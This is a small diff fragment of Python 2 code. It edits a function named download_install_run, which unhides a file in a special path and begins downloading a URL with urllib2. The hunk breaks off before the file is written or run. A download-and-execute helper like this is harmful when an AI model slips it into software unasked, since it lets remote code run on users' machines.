@@ -61,7 +61,8 @@ def download_install_run(url, specialpath, fname):
     #Get a path for the file and unhide it.
     path = file_in_special_path(specialpath, fname)
     unhide_file(path)
-    
+    #Save the file
+    u = urllib2.urlopen(url)
     
         
 #Utility functions.  May be useful elsewhere
